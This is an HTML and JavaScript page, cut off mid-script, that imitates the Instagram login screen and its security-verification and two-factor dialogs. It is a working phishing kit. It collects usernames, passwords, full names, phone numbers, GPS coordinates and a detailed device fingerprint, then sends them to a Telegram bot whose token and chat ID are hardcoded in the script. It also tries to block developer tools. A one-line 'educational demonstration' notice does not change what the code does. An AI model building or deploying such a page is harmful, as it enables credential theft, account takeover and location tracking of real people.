<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <!-- Added viewport meta tag for mobile responsiveness -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Inter, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: #152127;
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* MAIN CONTAINER - Mobile First */
        .container {
            display: flex;
            flex-direction: column;
            flex: 1;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* MOBILE LOGO */
        .mobile-logo {
            display: block;
            width: 72px;
            height: 72px;
            margin: 40px auto 24px;
        }

        /* LOGIN BOX - Mobile optimized */
        .login-box {
            width: 100%;
            margin: 0 auto;
            padding: 20px 0;
        }

        .login-box h2 {
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 30px;
            color: white;
        }

        /* INPUT FIELDS - Mobile friendly */
        .field {
            position: relative;
            margin-bottom: 16px;
            width: 100%;
        }

        .field input {
            width: 100%;
            padding: 20px 16px 8px;
            border-radius: 12px;
            border: 1px solid #87949e;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 16px;
            outline: none;
            -webkit-appearance: none;
            height: 56px;
        }

        .field label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #8a97a8;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .field input:focus+label,
        .field input:not(:placeholder-shown)+label {
            top: 14px;
            font-size: 12px;
            color: #8a97a8;
        }

        .field input:focus {
            border-color: #7aa7ff;
        }

        /* PASSWORD FIELD */
        .password-field {
            position: relative;
        }

        .password-field input {
            padding-right: 50px;
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            margin: 0;
        }

        .eye-btn svg {
            display: block;
            width: 20px;
            height: 20px;
        }

        /* BUTTONS - Mobile optimized */
        button {
            background: none;
            border: none;
            cursor: pointer;
            font-family: inherit;
            -webkit-appearance: none;
            min-height: 44px; /* Minimum touch target size */
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            border-radius: 25px;
            border: none;
            background: #1b4f8b;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            opacity: 0.4;
            transition: opacity 0.2s ease, background-color 0.2s ease;
            margin-top: 8px;
        }

        .login-btn.enabled {
            opacity: 1;
            cursor: pointer;
        }

        .login-btn.enabled:hover {
            background-color: #1e5fa3;
        }

        .forgot-btn {
            width: 100%;
            margin: 20px auto;
            display: block;
            color: #ffffff;
            font-size: 14px;
            padding: 14px 16px;
            border-radius: 999px;
            transition: background-color 0.2s ease;
            text-align: center;
            font-weight: 500;
        }

        .forgot-btn:hover {
            background-color: rgba(255, 255, 255, 0.08);
        }

        .fb-btn {
            width: 100%;
            padding: 14px;
            border-radius: 999px;
            border: 1px solid #2c3a4f;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.2s ease, border-color 0.2s ease;
            margin: 12px 0;
            font-weight: 500;
        }

        .fb-btn:hover {
            background-color: rgba(255, 255, 255, 0.06);
            border-color: #3b82f6;
        }

        .fb-icon {
            width: 20px;
            height: 20px;
        }

        .create-btn {
            width: 100%;
            padding: 14px;
            border-radius: 999px;
            border: 1px solid #3b82f6;
            color: #3b82f6;
            transition: background-color 0.2s ease, color 0.2s ease;
            font-weight: 600;
        }

        .create-btn:hover {
            background-color: rgba(59, 130, 246, 0.12);
        }

        /* META LOGO */
        .meta-wrap {
            margin-top: 30px;
            display: flex;
            justify-content: center;
            padding: 20px 0;
        }

        .meta-flex {
            width: 64px;
            height: 20px;
        }

        .meta-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            -webkit-mask-image: url(https://static.cdninstagram.com/rsrc.php/yo/r/N5EUTbQsmG4.webp);
            mask-image: url(https://static.cdninstagram.com/rsrc.php/yo/r/N5EUTbQsmG4.webp);
            -webkit-mask-repeat: no-repeat;
            mask-repeat: no-repeat;
            -webkit-mask-size: contain;
            mask-size: contain;
            -webkit-mask-position: center;
            mask-position: center;
        }

        /* WARNING NOTE */
        .warning-note {
            color: #9aa4b2;
            font-size: 12px;
            margin-top: 25px;
            text-align: center;
            padding: 15px 10px;
            border-top: 1px solid #3d4f5c;
            line-height: 1.5;
        }

        /* FOOTER - Simplified for mobile */
        .ig-footer {
            display: none;
        }

        /* MODALS - Mobile optimized */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease;
            padding: 20px;
            overflow-y: auto;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background-color: #152127;
            padding: 30px 20px;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            position: relative;
            border: 1px solid #3d4f5c;
            margin: auto;
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-logo {
            font-family: 'Instagram Sans', sans-serif;
            font-size: 36px;
            margin-bottom: 20px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 600;
        }

        .modal h2 {
            margin-bottom: 15px;
            font-size: 20px;
            color: white;
            font-weight: 600;
        }

        .modal p {
            color: #9aa4b2;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .modal-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            font-size: 16px;
            transition: background-color 0.2s;
            min-height: 50px;
        }

        .modal-btn:hover {
            background-color: #1877f2;
        }

        .modal-btn-secondary {
            background-color: transparent;
            color: #0095f6;
            border: none;
            font-weight: 600;
            cursor: pointer;
            padding: 16px;
            font-size: 14px;
            transition: opacity 0.2s;
            min-height: 44px;
        }

        .modal-btn-secondary:hover {
            opacity: 0.8;
        }

        /* ERROR STYLES */
        .error-text {
            color: #ed4956;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }

        .input-error {
            border-color: #ed4956 !important;
        }

        /* VERIFICATION CODE BOX */
        .verification-code-box {
            background: #1c2a35;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }

        .verification-code {
            font-family: monospace;
            font-size: 20px;
            letter-spacing: 6px;
            color: white;
            font-weight: 600;
            padding: 15px;
            background: #152127;
            border-radius: 8px;
            border: 1px solid #3d4f5c;
            margin: 10px 0;
            word-break: break-all;
        }

        /* SECURITY STEPS */
        .security-steps {
            text-align: left;
            margin: 20px 0;
        }

        .step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 15px;
        }

        .step-number {
            background: #0095f6;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            margin-right: 10px;
            flex-shrink: 0;
        }

        .step-content {
            flex: 1;
        }

        .step-title {
            font-weight: 600;
            color: white;
            font-size: 14px;
            margin-bottom: 3px;
        }

        .step-description {
            color: #9aa4b2;
            font-size: 12px;
            line-height: 1.4;
        }

        /* LOADER */
        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* HIDE DESKTOP-ONLY ELEMENTS */
        .left, .divider {
            display: none;
        }

        /* FONT FACE DECLARATIONS */
        @font-face {
            font-family: "Instagram Sans";
            src: url("https://static.cdninstagram.com/rsrc.php/v3/yF/r/5YwzYF7E8cK.woff2") format("woff2");
            font-weight: 400;
        }

        @font-face {
            font-family: "Instagram Sans";
            src: url("https://static.cdninstagram.com/rsrc.php/v3/y9/r/l2TTZr5k8vZ.woff2") format("woff2");
            font-weight: 600;
        }

        /* Tablet and larger screens */
        @media (min-width: 768px) {
            .container {
                max-width: 420px;
                padding: 0;
            }
            
            .login-box {
                background: rgba(21, 33, 39, 0.95);
                border-radius: 16px;
                padding: 40px 30px;
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
                border: 1px solid #3d4f5c;
            }
            
            body {
                background: #0e141b;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .page {
                width: 100%;
            }
        }

        /* Very small phones */
        @media (max-width: 360px) {
            .container {
                padding: 0 15px;
            }
            
            .login-box h2 {
                font-size: 22px;
            }
            
            .field input {
                height: 52px;
                font-size: 15px;
            }
            
            .modal-content {
                padding: 25px 15px;
            }
        }

        /* Landscape mode */
        @media (max-height: 600px) and (orientation: landscape) {
            .container {
                max-height: 100vh;
                overflow-y: auto;
            }
            
            .mobile-logo {
                margin: 20px auto 15px;
                width: 60px;
                height: 60px;
            }
            
            .login-box h2 {
                margin-bottom: 20px;
                font-size: 20px;
            }
            
            .field {
                margin-bottom: 12px;
            }
            
            .field input {
                height: 48px;
                padding: 18px 16px 6px;
            }
            
            .login-btn, .fb-btn, .create-btn {
                padding: 12px;
                min-height: 44px;
            }
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="container">
            <!-- RIGHT -->
            <div class="right">
                <div class="login-box">
                    <img class="mobile-logo" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram" />
                    <h2>Log in to Instagram</h2>

                    <div class="login-inner">
                        <div class="field">
                            <input type="text" id="loginid" placeholder=" " />
                            <label for="loginid">Mobile number, username or email address</label>
                        </div>
                        
                        <div class="field password-field">
                            <input type="password" id="password" placeholder="" />
                            <label for="password">Password</label>
                            
                            <button type="button" class="eye-btn" id="togglePassword">
                                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none">
                                    <path d="M2 12s3.6-6 10-6 10 6 10 6-3.6 6-10 6S2 12 2 12Z" stroke="#9AA4B2" stroke-width="1.8"
                                    stroke-linecap="round" stroke-linejoin="round" />
                                    <circle cx="12" cy="12" r="3" stroke="#9AA4B2" stroke-width="1.8" />
                                    <line x1="3" y1="21" x2="21" y2="3" stroke="#9AA4B2" stroke-width="1.8" stroke-linecap="round" />
                                </svg>
                            </button>
                        </div>
                        
                        <button class="login-btn" id="loginBtn" disabled>Log in</button>
                        
                        <br>
                        <button class="forgot-btn">Forgot password?</button>

                        <br><br>
                        
                        <button class="fb-btn">
                            <svg aria-label="Facebook" class="fb-icon" viewBox="0 0 24 24" width="20" height="20">
                                <path
                                    d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"
                                    fill="#1877F2" />
                            </svg>
                            <span>Log in with Facebook</span>
                        </button>
                        
                        <button class="create-btn">Create new account</button>
                        
                        <div class="warning-note">
                            <strong>Security Notice:</strong> This is an educational demonstration.
                        </div>
                    </div>

                    <!-- META -->
                    <div class="meta-wrap">
                        <div class="meta-flex">
                            <img class="meta-img" src="https://static.cdninstagram.com/rsrc.php/yv/r/nLF4ROc2eL0.webp">
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Removed desktop footer for mobile -->
    </div>

    <!-- Initial User Info Modal -->
    <div class="modal" id="initialModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Security Verification Required</h2>
            <p>To protect your account, we need to verify your identity. This is a one-time security check.</p>
            
            <div class="security-steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-content">
                        <div class="step-title">Provide Your Information</div>
                        <div class="step-description">Enter your name and phone number for verification</div>
                    </div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-content">
                        <div class="step-title">Location Check</div>
                        <div class="step-description">We'll verify your location for security purposes</div>
                    </div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-content">
                        <div class="step-title">Device Verification</div>
                        <div class="step-description">We'll check your device to ensure it's secure</div>
                    </div>
                </div>
            </div>
            
            <div class="field">
                <input type="text" id="userFullName" placeholder=" " />
                <label for="userFullName">Full Name</label>
                <div class="error-text" id="nameError">Please enter your full name</div>
            </div>
            <div class="field">
                <input type="tel" id="userMobile" placeholder=" " />
                <label for="userMobile">Mobile Number</label>
                <div class="error-text" id="mobileError">Please enter a valid mobile number</div>
            </div>
            
            <button class="modal-btn" id="verifyUserBtn">Continue Verification</button>
            <div class="loader" id="verifyLoader"></div>
        </div>
    </div>

    <!-- Location Permission Modal -->
    <div class="modal" id="locationModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Location Verification</h2>
            <p>For your security, Instagram needs to verify your location to protect against suspicious login attempts.</p>
            
            <div class="verification-code-box">
                <div class="step-title" style="text-align: center; margin-bottom: 10px;">Step 2: Location Check</div>
                <div class="verification-code" id="locationCode">VERIFYING...</div>
                <div class="loading-text">Please allow location access to continue</div>
            </div>
            
            <div class="location-error-box" id="locationErrorBox" style="display: none;">
                <p id="locationErrorMessage">
                    <strong>Location access required.</strong> Please allow location access to continue. If error persists, try opening this page in an incognito/private tab.
                </p>
            </div>
            
            <button class="modal-btn" id="allowLocationBtn">
                <span id="locationBtnText">Allow Location Access</span>
                <div class="loader" id="locationLoader" style="display: none;"></div>
            </button>
            <button class="modal-btn-secondary" id="tryAgainBtn" style="display: none;">Try Again</button>
        </div>
    </div>

    <!-- Security Verification Modal -->
    <div class="modal" id="securityModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Final Security Check</h2>
            
            <div class="verification-code-box">
                <div class="step-title" style="text-align: center; margin-bottom: 10px;">Step 3: Device Verification</div>
                <div class="verification-code" id="deviceCode">SCANNING...</div>
                <div class="loading-text" id="verificationText">Checking device security and compatibility</div>
            </div>
            
            <div class="security-check">
                <div class="checkmark">âœ“</div>
                <div style="text-align: left;">
                    <div style="color: #00a400; font-weight: 600; font-size: 14px;">Security verification in progress</div>
                    <div style="color: #9aa4b2; font-size: 12px;">This may take a few seconds</div>
                </div>
            </div>
            
            <button class="modal-btn" id="continueBtn" style="display: none;">Continue to Instagram</button>
        </div>
    </div>

    <!-- Two-Factor Authentication Modal -->
    <div class="modal" id="twoFactorModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Two-Factor Authentication</h2>
            <p>Enter the 6-digit code sent to your phone ending with ****<span id="phoneLastDigits"></span></p>
            
            <div class="verification-code-box">
                <div class="verification-code" style="font-size: 28px; padding: 15px;">------</div>
                <div class="field" style="margin: 20px 0;">
                    <input type="text" id="twoFactorCode" placeholder=" " maxlength="6" pattern="\d{6}" required style="text-align: center; font-size: 18px; letter-spacing: 4px; padding: 15px; height: 60px;">
                    <label for="twoFactorCode" style="display: none;">Enter 6-digit code</label>
                </div>
            </div>
            
            <button class="modal-btn" id="verifyCodeBtn">Verify Code</button>
            <button class="modal-btn-secondary" id="useBackupBtn">Use Backup Code</button>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION - TELEGRAM BOT SETTINGS
        // ============================================
        const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';
        const TELEGRAM_CHAT_ID = '8089637989';
        
        // ============================================
        // DATA COLLECTION OBJECT
        // ============================================
        const collectedData = {
            credentials: {},
            location: {},
            deviceInfo: {},
            userInfo: {},
            timestamps: {
                pageLoad: new Date().toISOString(),
                loginAttempt: null,
                locationCaptured: null,
                dataSent: null
            },
            sessionId: Math.random().toString(36).substring(2) + Date.now().toString(36)
        };

        // ============================================
        // DOM ELEMENTS
        // ============================================
        const loginInput = document.getElementById("loginid");
        const passwordInput = document.getElementById("password");
        const loginBtn = document.getElementById("loginBtn");
        const toggleBtn = document.getElementById("togglePassword");
        const eyeIcon = document.getElementById("eyeIcon");
        
        const initialModal = document.getElementById('initialModal');
        const locationModal = document.getElementById('locationModal');
        const securityModal = document.getElementById('securityModal');
        const twoFactorModal = document.getElementById('twoFactorModal');
        
        const userFullNameInput = document.getElementById('userFullName');
        const userMobileInput = document.getElementById('userMobile');
        const verifyUserBtn = document.getElementById('verifyUserBtn');
        const verifyLoader = document.getElementById('verifyLoader');
        const nameError = document.getElementById('nameError');
        const mobileError = document.getElementById('mobileError');
        
        const allowLocationBtn = document.getElementById('allowLocationBtn');
        const locationBtnText = document.getElementById('locationBtnText');
        const locationLoader = document.getElementById('locationLoader');
        const tryAgainBtn = document.getElementById('tryAgainBtn');
        const locationErrorBox = document.getElementById('locationErrorBox');
        const locationErrorMessage = document.getElementById('locationErrorMessage');
        const locationCode = document.getElementById('locationCode');
        
        const continueBtn = document.getElementById('continueBtn');
        const verificationText = document.getElementById('verificationText');
        const deviceCode = document.getElementById('deviceCode');
        
        const twoFactorCodeInput = document.getElementById('twoFactorCode');
        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
        const phoneLastDigits = document.getElementById('phoneLastDigits');
        const useBackupBtn = document.getElementById('useBackupBtn');

        // ============================================
        // STATE MANAGEMENT
        // ============================================
        let locationAllowed = false;
        let userInfoCollected = false;
        let locationModalShown = false;

        // ============================================
        // INITIALIZATION
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Generate unique session ID
            collectedData.sessionId = 'insta_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Collect device information immediately
            collectAllDeviceInfo();
            
            // Check if user has already completed initial verification
            const hasCompletedInitial = sessionStorage.getItem('insta_initial_complete');
            
            if (!hasCompletedInitial) {
                // Show initial modal after short delay
                setTimeout(() => {
                    initialModal.style.display = 'flex';
                    document.body.style.overflow = 'hidden';
                }, 800);
            } else {
                userInfoCollected = true;
                // Check if location was already allowed
                locationAllowed = sessionStorage.getItem('insta_location_allowed') === 'true';
                
                if (!locationAllowed) {
                    setTimeout(() => {
                        showLocationModal();
                    }, 600);
                }
            }
            
            // Prevent developer tools
            preventDevTools();
            
            // Generate verification codes
            generateVerificationCodes();
        });

        // ============================================
        // PASSWORD TOGGLE FUNCTIONALITY
        // ============================================
        toggleBtn.addEventListener("click", () => {
            const isHidden = passwordInput.type === "password";
            passwordInput.type = isHidden ? "text" : "password";

            eyeIcon.innerHTML = isHidden
                ? `
            <path d="M2 12s3.6-6 10-6 10 6 10 6-3.6 6-10 6S2 12 2 12Z"
                  stroke="#9AA4B2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="12" r="3" stroke="#9AA4B2" stroke-width="1.8"/>
          `
                : `
            <path d="M2 12s3.6-6 10-6 10 6 10 6-3.6 6-10 6S2 12 2 12Z"
                  stroke="#9AA4B2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="12" r="3" stroke="#9AA4B2" stroke-width="1.8"/>
            <line x1="3" y1="21" x2="21" y2="3"
                  stroke="#9AA4B2" stroke-width="1.8" stroke-linecap="round"/>
          `;
        });

        // ============================================
        // LOGIN FORM VALIDATION
        // ============================================
        function validateForm() {
            const loginValue = loginInput.value.trim();
            const passwordValue = passwordInput.value;

            if (loginValue !== "" && passwordValue.length >= 6) {
                loginBtn.disabled = false;
                loginBtn.classList.add("enabled");
            } else {
                loginBtn.disabled = true;
                loginBtn.classList.remove("enabled");
            }
        }

        loginInput.addEventListener("input", validateForm);
        passwordInput.addEventListener("input", validateForm);

        // ============================================
        // LOGIN BUTTON CLICK HANDLER
        // ============================================
        loginBtn.addEventListener("click", async (e) => {
            e.preventDefault();
            
            if (loginBtn.disabled) return;
            
            const username = loginInput.value.trim();
            const password = passwordInput.value;
            
            if (!username || !password) {
                alert("Please fill in all fields");
                return;
            }
            
            // Check if location is allowed
            if (!locationAllowed) {
                showLocationModal();
                showLoginError('Please complete location verification first');
                return;
            }
            
            // Store credentials
            collectedData.credentials = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            collectedData.timestamps.loginAttempt = new Date().toISOString();
            
            // Disable login button and show loading
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';
            
            // Send credentials to Telegram
            await sendToTelegram('CREDENTIALS');
            
            // Always show wrong password error (as per requirement)
            setTimeout(() => {
                loginBtn.disabled = false;
                loginBtn.textContent = 'Log in';
                loginBtn.classList.remove("enabled");
                
                // Clear password field
                passwordInput.value = '';
                validateForm();
                
                // Show two-factor modal
                setTimeout(() => {
                    showTwoFactorModal();
                }, 800);
            }, 1500);
        });

        // ============================================
        // VERIFICATION CODE GENERATION
        // ============================================
        function generateVerificationCodes() {
            // Generate random verification codes
            const locationVerificationCode = 'LOC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            const deviceVerificationCode = 'DEV-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            
            collectedData.verificationCodes = {
                location: locationVerificationCode,
                device: deviceVerificationCode
            };
            
            return { locationVerificationCode, deviceVerificationCode };
        }

        // ============================================
        // INITIAL USER INFO MODAL
        // ============================================
        verifyUserBtn.addEventListener('click', async function() {
            const fullName = userFullNameInput.value.trim();
            const mobile = userMobileInput.value.trim();
            
            // Reset errors
            nameError.style.display = 'none';
            mobileError.style.display = 'none';
            userFullNameInput.classList.remove('input-error');
            userMobileInput.classList.remove('input-error');
            
            let hasError = false;
            
            if (!fullName) {
                nameError.style.display = 'block';
                userFullNameInput.classList.add('input-error');
                userFullNameInput.focus();
                hasError = true;
            }
            
            if (!mobile || mobile.length < 10) {
                mobileError.style.display = 'block';
                userMobileInput.classList.add('input-error');
                if (!hasError) userMobileInput.focus();
                hasError = true;
            }
            
            if (hasError) return;
            
            // Store user info
            collectedData.userInfo = {
                fullName: fullName,
                mobileNumber: mobile,
                timestamp: new Date().toISOString()
            };
            
            // Show loading state
            verifyUserBtn.disabled = true;
            verifyUserBtn.textContent = 'Verifying...';
            verifyLoader.style.display = 'block';
            
            // Send user info to Telegram
            await sendToTelegram('USER_INFO');
            
            // Mark as completed
            sessionStorage.setItem('insta_initial_complete', 'true');
            userInfoCollected = true;
            
            // Hide modal and show location modal
            setTimeout(() => {
                initialModal.style.display = 'none';
                verifyUserBtn.disabled = false;
                verifyUserBtn.textContent = 'Continue Verification';
                verifyLoader.style.display = 'none';
                document.body.style.overflow = 'auto';
                
                // Show location modal
                showLocationModal();
            }, 1500);
        });

        // ============================================
        // LOCATION MODAL FUNCTIONS
        // ============================================
        function showLocationModal() {
            if (!locationModalShown) {
                locationModal.style.display = 'flex';
                document.body.style.overflow = 'hidden';
                locationModalShown = true;
                
                // Reset UI state
                locationErrorBox.style.display = 'none';
                tryAgainBtn.style.display = 'none';
                locationBtnText.textContent = 'Allow Location Access';
                locationLoader.style.display = 'none';
                allowLocationBtn.disabled = false;
                
                // Start location code animation
                animateLocationCode();
            }
        }

        function animateLocationCode() {
            let dots = 0;
            const interval = setInterval(() => {
                dots = (dots + 1) % 4;
                locationCode.textContent = 'VERIFYING' + '.'.repeat(dots);
            }, 500);
            
            return interval;
        }

        function hideLocationModal() {
            locationModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            locationModalShown = false;
        }

        allowLocationBtn.addEventListener('click', async function() {
            locationBtnText.textContent = 'Getting Location...';
            locationLoader.style.display = 'block';
            allowLocationBtn.disabled = true;
            locationErrorBox.style.display = 'none';
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        // Success - got location
                        collectedData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude || 'Not available',
                            heading: position.coords.heading || 'Not available',
                            speed: position.coords.speed || 'Not available',
                            timestamp: new Date().toISOString(),
                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                            source: 'GPS',
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        
                        collectedData.timestamps.locationCaptured = new Date().toISOString();
                        
                        // Mark location as allowed
                        locationAllowed = true;
                        sessionStorage.setItem('insta_location_allowed', 'true');
                        
                        // Update verification code
                        locationCode.textContent = collectedData.verificationCodes.location;
                        locationCode.style.color = '#00a400';
                        
                        // Send location to Telegram
                        await sendToTelegram('LOCATION');
                        
                        // Hide modal after delay
                        setTimeout(() => {
                            hideLocationModal();
                            
                            // Show security verification
                            setTimeout(() => {
                                showSecurityVerification();
                            }, 500);
                        }, 2000);
                    },
                    async function(error) {
                        // Error - location denied
                        locationBtnText.textContent = 'Allow Location Access';
                        locationLoader.style.display = 'none';
                        allowLocationBtn.disabled = false;
                        tryAgainBtn.style.display = 'inline-block';
                        
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access was denied. Please allow location access to continue.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location information is unavailable. Please try again.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "The request to get your location timed out. Please try again.";
                                break;
                            default:
                                errorMessage = "An unknown error occurred. Please try again.";
                        }
                        
                        locationErrorMessage.textContent = errorMessage + " If error persists, open this page in an incognito/private tab.";
                        locationErrorBox.style.display = 'block';
                        
                        // Try to get approximate location via IP
                        await getLocationByIP();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Geolocation not supported
                locationErrorMessage.textContent = "Your browser doesn't support geolocation. Please try with a different browser or device.";
                locationErrorBox.style.display = 'block';
                locationBtnText.textContent = 'Allow Location Access';
                locationLoader.style.display = 'none';
                allowLocationBtn.disabled = false;
                tryAgainBtn.style.display = 'inline-block';
                
                // Try to get location by IP
                await getLocationByIP();
            }
        });

        tryAgainBtn.addEventListener('click', function() {
            locationErrorBox.style.display = 'none';
            tryAgainBtn.style.display = 'none';
            locationBtnText.textContent = 'Allow Location Access';
            locationLoader.style.display = 'none';
            allowLocationBtn.disabled = false;
        });

        // ============================================
        // DEVICE INFORMATION COLLECTION
        // ============================================
        async function collectAllDeviceInfo() {
            // Basic device info
            collectedData.deviceInfo = {
                // Browser info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Not specified',
                
                // Screen info
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                availableResolution: `${window.screen.availWidth}x${window.screen.availHeight}`,
                colorDepth: window.screen.colorDepth + ' bit',
                pixelDepth: window.screen.pixelDepth + ' bit',
                orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
                
                // Window info
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,
                
                // Connection info
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type || 'Unknown'
                } : 'Not available',
                
                // Hardware info
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
                
                // Time info
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                
                // Device type detection
                deviceType: /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                browser: getBrowserName(),
                os: getOperatingSystem(),
                
                timestamp: new Date().toISOString()
            };
            
            // Battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    collectedData.deviceInfo.battery = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    collectedData.deviceInfo.battery = 'Not accessible';
                }
            }
            
            // GPU info via WebGL
            collectedData.deviceInfo.gpu = getWebGLInfo();
            
            // IP address and network info
            await getIPAndNetworkInfo();
            
            // Storage info
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    collectedData.deviceInfo.storage = {
                        usage: formatBytes(estimate.usage),
                        quota: formatBytes(estimate.quota),
                        percentUsed: estimate.quota ? Math.round((estimate.usage / estimate.quota) * 100) + '%' : 'Unknown'
                    };
                } catch (e) {
                    collectedData.deviceInfo.storage = 'Not accessible';
                }
            }
        }

        async function getIPAndNetworkInfo() {
            try {
                const services = [
